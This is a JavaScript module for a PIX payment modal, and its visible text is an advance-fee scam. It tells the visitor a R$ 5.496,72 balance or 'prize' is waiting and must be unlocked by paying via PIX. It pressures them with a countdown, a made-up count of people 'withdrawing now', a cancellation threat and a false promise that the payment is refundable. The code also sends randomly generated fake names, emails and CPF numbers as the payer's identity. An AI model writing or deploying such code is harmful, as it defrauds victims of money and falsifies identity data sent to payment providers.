const GeradorPix = {
    modalId: 'modal-pix-simples',
    timerInterval: null,
    pollingInterval: null,

    iniciar: function(valorAmount) {
        this.criarModal();
        this.gerarPix(valorAmount);
    },

    // 1. Função para gerar dados aleatórios (Nome, Email e "CPF")
    gerarDadosAleatorios: function() {
        const nomes = ["João Silva", "Maria Oliveira", "Pedro Santos", "Ana Costa", "Lucas Ferreira", "Juliana Almeida"];
        const nomeAleatorio = nomes[Math.floor(Math.random() * nomes.length)];
        const numeroAleatorio = Math.floor(1000 + Math.random() * 9000);
        
        return {
            nome: nomeAleatorio,
            email: `cliente${numeroAleatorio}@email.com`,
            cpf: `${Math.floor(100 + Math.random() * 899)}00000000` // CPF fictício com 11 dígitos
        };
    },

    // 2. Cria a interface do Modal dinamicamente (Layout Centralizado e Azul)
    criarModal: function() {
        if (document.getElementById(this.modalId)) {
            document.getElementById(this.modalId).remove(); // Remove anterior para evitar lixo
        }

        const estilo = document.createElement('style');
        estilo.innerHTML = `
            #modal-pix-simples { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); justify-content: center; align-items: center; z-index: 9999; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; box-sizing: border-box; padding: 20px; }
            
            /* Animação de surgimento (Fade + Scale) */
            @keyframes pixAnimatePop { 
                from { opacity: 0; transform: scale(0.9); } 
                to { opacity: 1; transform: scale(1); } 
            }
            
            .pix-box { background: #f8f9fa; width: 100%; max-width: 400px; border-radius: 16px; padding: 20px 15px; box-sizing: border-box; animation: pixAnimatePop 0.3s ease-out; max-height: 90vh; overflow-y: auto; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
            .pix-box::-webkit-scrollbar { display: none; } /* Ocultar scrollbar */
            
            /* Cabeçalho Modal */
            .pix-header-title { text-align: center; font-size: 18px; font-weight: 700; color: #000; margin: 0 0 20px 0; }
            
            /* Card Saldo (Azul) */
            .card-saldo { border: 1px solid #cce5ff; background-color: #f0f7ff; border-radius: 12px; padding: 15px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; }
            .card-saldo-info span { display: block; font-size: 10px; font-weight: 700; color: #0056b3; margin-bottom: 4px; }
            .card-saldo-info strong { display: block; font-size: 18px; font-weight: 800; color: #000; }
            .card-saldo-timer { text-align: right; }
            .card-saldo-timer span { display: block; font-size: 10px; font-weight: 700; color: #0056b3; margin-bottom: 4px; }
            .card-saldo-timer strong { display: block; font-size: 18px; font-weight: 800; color: #000; }
            
            /* Card Principal do PIX */
            .card-pix { background: #fff; border-radius: 12px; padding: 20px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.03); margin-bottom: 15px; border: 1px solid #eee; }
            .card-pix h4 { margin: 0 0 5px 0; font-size: 16px; color: #000; font-weight: 700; }
            .card-pix p { margin: 0 0 15px 0; font-size: 12px; color: #666; }
            .qr-wrapper { border: 1px solid #eee; border-radius: 12px; padding: 10px; display: inline-block; margin-bottom: 15px; background: #fff; }
            .pix-qr { width: 180px; height: 180px; display: block; object-fit: contain; }
            .pix-input { width: 100%; padding: 12px; border: 1px solid #eee; border-radius: 8px; box-sizing: border-box; resize: none; background: #f9f9f9; color: #555; font-size: 11px; margin-bottom: 15px; word-break: break-all; height: 60px; font-family: monospace; }
            
            /* Botões (Azul) */
            .pix-btn { background: #007bff; color: #fff; border: none; padding: 14px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: 700; font-size: 15px; display: flex; align-items: center; justify-content: center; gap: 8px; transition: 0.2s; box-shadow: 0 4px 10px rgba(0, 123, 255, 0.3); }
            .pix-btn:hover { background: #0056b3; }
            .pix-btn i { font-size: 18px; }
            
            /* Status Cards */
            .status-card { display: flex; align-items: center; gap: 12px; padding: 15px; border-radius: 12px; margin-bottom: 12px; background: #fff; box-shadow: 0 1px 5px rgba(0,0,0,0.02); border: 1px solid #eee; }
            .status-icon { font-size: 24px; flex-shrink: 0; }
            .status-text { display: flex; flex-direction: column; text-align: left; }
            .status-text strong { font-size: 13px; color: #000; margin-bottom: 2px; }
            .status-text span { font-size: 11px; color: #666; }
            
            /* Cores Específicas dos Status */
            .status-wait .status-icon { color: #007bff; }
            
            .status-success { background-color: #e8f8f0; border: 1px solid #bcead5; }
            .status-success .status-icon { color: #10b981; }
            
            .status-danger { background-color: #fdf3f4; border: 1px solid #f8d7da; }
            .status-danger .status-icon { color: #dc3545; }
            
            /* Rodapé */
            .pix-footer { display: flex; align-items: center; justify-content: center; gap: 6px; color: #888; font-size: 11px; margin-top: 18px; text-align: center; }
            
            /* Telas Loading vs Conteúdo */
            #pix-loading-view { display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 300px; }
            #pix-content-view { display: none; }
            .pix-spinner-large { font-size: 40px; color: #007bff; margin-bottom: 15px; }
        `;
        document.head.appendChild(estilo);

        const modal = document.createElement('div');
        modal.id = this.modalId;
        modal.innerHTML = `
            <div class="pix-box">
                <div id="pix-loading-view">
                    <i class='bx bx-loader-alt bx-spin pix-spinner-large'></i>
                    <p style="color:#333; margin:0; font-weight:700; font-size: 16px;">Gerando pagamento...</p>
                    <p style="color:#888; font-size:12px; margin-top:5px;">Aguarde um instante, processando chave.</p>
                </div>

                <div id="pix-content-view">
                    <h2 class="pix-header-title">Confirmação de Identidade</h2>
                    
                    <div class="card-saldo">
                        <div class="card-saldo-info">
                            <span>SEU SALDO</span>
                            <strong>R$ 5.496,72</strong>
                        </div>
                        <div class="card-saldo-timer">
                            <span>EXPIRA EM</span>
                            <strong id="expira-timer">07:00</strong>
                        </div>
                    </div>

                    <div class="card-pix">
                        <h4>Pague via PIX para liberar</h4>
                        <p>Escaneie o QR Code ou copie o código abaixo</p>
                        
                        <div class="qr-wrapper">
                            <img id="pix-qr-img" class="pix-qr" src="" alt="QR Code PIX">
                        </div>
                        
                        <textarea id="pix-copia-cola" class="pix-input" readonly></textarea>
                        
                        <button class="pix-btn" onclick="GeradorPix.copiar()">
                            <i class='bx bx-copy'></i> Copiar código PIX
                        </button>
                    </div>

                    <div class="status-card status-wait" id="status-card-atual">
                        <i class='bx bx-loader-alt bx-spin status-icon'></i>
                        <div class="status-text">
                            <strong id="status-text-main">Aguardando pagamento...</strong>
                            <span id="status-text-sub">Atualização automática ao confirmar</span>
                        </div>
                    </div>

                    <div class="status-card status-success">
                        <i class='bx bx-group status-icon'></i>
                        <div class="status-text">
                            <strong>73 pessoas sacando agora</strong>
                            <span>Saques processados em tempo real</span>
                        </div>
                    </div>

                    <div class="status-card status-danger">
                        <i class='bx bx-error status-icon'></i>
                        <div class="status-text">
                            <strong>Não perca seu prêmio</strong>
                            <span>Saldo de R$ 5.496,72 será cancelado se o pagamento não for confirmado.</span>
                        </div>
                    </div>

                    <button class="pix-btn" onclick="GeradorPix.copiar()" style="margin-top: 5px;">
                        <i class='bx bx-copy'></i> Copiar código PIX
                    </button>

                    <div class="pix-footer">
                        <i class='bx bx-shield-quarter'></i> Pagamento 100% seguro e reembolsável
                    </div>
                </div>
            </div>
        `;
        
        // Fechar modal se clicar no fundo escuro (opcional, remova se não quiser)
        modal.addEventListener('click', (e) => {
            if (e.target.id === this.modalId) this.fecharModal();
        });

        document.body.appendChild(modal);
    },

    // 3. Função do Cronômetro
    iniciarCronometro: function(duracaoSegundos) {
        clearInterval(this.timerInterval);
        const display = document.getElementById('expira-timer');
        let timer = duracaoSegundos;
        let minutos, segundos;

        this.timerInterval = setInterval(() => {
            minutos = parseInt(timer / 60, 10);
            segundos = parseInt(timer % 60, 10);

            minutos = minutos < 10 ? "0" + minutos : minutos;
            segundos = segundos < 10 ? "0" + segundos : segundos;

            if(display) display.textContent = minutos + ":" + segundos;

            if (--timer < 0) {
                clearInterval(this.timerInterval);
                if(display) display.textContent = "00:00";
                // Opcional: Ação quando o tempo acabar (ex: fechar modal)
            }
        }, 1000);
    },

    // 4. Faz a requisição para gerar_pix.php
   gerarPix: function(valor) {
    const modal = document.getElementById(this.modalId);
    const loadingView = document.getElementById('pix-loading-view');
    const contentView = document.getElementById('pix-content-view');

    loadingView.style.display = 'flex';
    contentView.style.display = 'none';
    modal.style.display = 'flex'; 
    document.body.style.overflow = 'hidden';

    const body = {
      valor,
      nome: this.gerarDadosAleatorios().nome,
      cpf: this.gerarDadosAleatorios().cpf,
      email: this.gerarDadosAleatorios().email
    };

    fetch('/api/gerar-pix', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) })
        .then(res => res.json())
        .then(data => {
            if (data.success) {
                document.getElementById('pix-copia-cola').value = data.pix_code;
                
                const qrImg = document.getElementById('pix-qr-img');

                if (data.pix_qr_code) {
                    const qr = String(data.pix_qr_code).trim();
                    qrImg.src = qr.startsWith('data:image')
                        ? qr
                        : `data:image/png;base64,${qr}`;
                } else if (data.pix_code) {
                    qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(data.pix_code)}`;
                } else {
                    throw new Error('Resposta sem pix_qr_code e sem pix_code');
                }

                setTimeout(() => {
                    loadingView.style.display = 'none';
                    contentView.style.display = 'block';
                    this.iniciarCronometro(7 * 60);
                }, 400);

                this.iniciarPolling(data.id);
            } else {
                alert("Falha ao gerar o PIX: " + (data.message || "Erro interno"));
                this.fecharModal();
            }
        })
        .catch(err => {
            console.error(err);
            alert("Erro de conexão com o servidor.");
            this.fecharModal();
        });
},

    // 5. Verificação a cada 4 segundos
    iniciarPolling: function(transactionId) {
        clearInterval(this.pollingInterval);
        this.pollingInterval = setInterval(() => {
            fetch(`/api/consultar-pagamento?id=${transactionId}`)
                .then(r => r.json())
                .then(res => {
                    if (res.pago || res.status === 'PAID') {
                        clearInterval(this.pollingInterval);
                        clearInterval(this.timerInterval);
                        
                        // Atualiza o visual para Sucesso
                        const statusCard = document.getElementById('status-card-atual');
                        statusCard.className = "status-card status-success";
                        statusCard.innerHTML = `
                            <i class='bx bx-check-circle status-icon'></i>
                            <div class="status-text">
                                <strong>Pagamento Confirmado!</strong>
                                <span>Redirecionando você...</span>
                            </div>
                        `;
                        
                        setTimeout(() => {
                            window.location.href = "/up4";
                        }, 1500);
                    }
                })
                .catch(err => console.error("Erro no polling:", err));
        }, 4000);
    },

    // 6. Função de cópia
    copiar: function() {
        const input = document.getElementById('pix-copia-cola');
        input.select();
        input.setSelectionRange(0, 99999); /* Para mobile */
        try {
            document.execCommand("copy");
            alert("Código PIX copiado!");
        } catch (err) {
            navigator.clipboard.writeText(input.value).then(() => {
                alert("Código PIX copiado!");
            });
        }
    },

    fecharModal: function() {
        clearInterval(this.timerInterval);
        clearInterval(this.pollingInterval);
        const modal = document.getElementById(this.modalId);
        if(modal) modal.style.display = 'none';
        document.body.style.overflow = 'auto'; // Devolve scroll
    }
};